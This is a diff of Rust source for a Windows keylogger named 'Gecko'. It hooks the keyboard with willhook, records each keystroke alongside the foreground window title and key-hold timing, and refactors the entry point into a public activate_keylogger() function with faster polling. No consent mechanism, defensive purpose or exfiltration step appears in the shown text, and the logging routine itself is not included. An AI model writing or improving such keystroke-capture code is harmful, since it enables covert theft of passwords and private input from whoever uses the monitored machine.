@@ -2,44 +2,39 @@ use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 use std::thread;
+use std::sync::mpsc;
 use willhook::{keyboard_hook, InputEvent, KeyboardKey};
 use winapi::um::winuser::{GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL, VK_SHIFT};
 use winapi::um::winuser::GetAsyncKeyState;
 
-// Non stable previous version of the code
-fn main() {
-    let (sender, receiver) = std::sync::mpsc::channel();
+pub fn activate_keylogger() {
+    let (sender, receiver) = mpsc::channel();
     let held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>> = Arc::new(Mutex::new(HashMap::new()));
     let held_keys_clone = Arc::clone(&held_keys);
     let h = keyboard_hook().unwrap();
-    let mut last_title = String::new();
     println!("Gecko activating...");
 
-    // Spawn a thread for keyboard event handling
+    // Keyboard Event Handling thread
     let keyboard_handle = thread::spawn(move || {
         keyboard_event_handler(h, held_keys_clone, receiver);
     });
 
-    // Monitor active window changes in the main thread
     loop {
         if exit_condition() {
             println!("Gecko deactivating...");
-            // Signal termination to the keyboard handling thread
-            sender.send(()).expect("Failed to send termination signal");
+            if let Err(err) = sender.send(()) {
+                eprintln!("Failed to send termination signal: {}", err);
+            }
             break;
         }
 
-        let title = active_window();
-        // Process active window changes
-
-        std::thread::sleep(Duration::from_millis(50)); // Reduced sleep time
+        std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
     }
 
-    // Wait for the keyboard thread to finish
     keyboard_handle.join().unwrap();
 }
 
-fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: std::sync::mpsc::Receiver<()>) {
+fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>) {
     let mut last_title = String::new();
     loop {
         if let Ok(ie) = h.try_recv() {
@@ -53,12 +48,11 @@ fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<Keyboa
             }
         }
 
-        // Check for termination signal
         if receiver.try_recv().is_ok() {
             break;
         }
 
-        std::thread::sleep(Duration::from_millis(50)); // Reduced sleep time
+        std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
     }
 }
 
@@ -80,8 +74,7 @@ fn handle_key_event(
                 let elapsed = Instant::now().duration_since(inittime);
                 if elapsed.as_millis() < 400 {
                     log_key(&last_title, key, None);
-                }
-                else {
+                } else {
                     log_key(&last_title, key, Some(elapsed));
                 }
             }
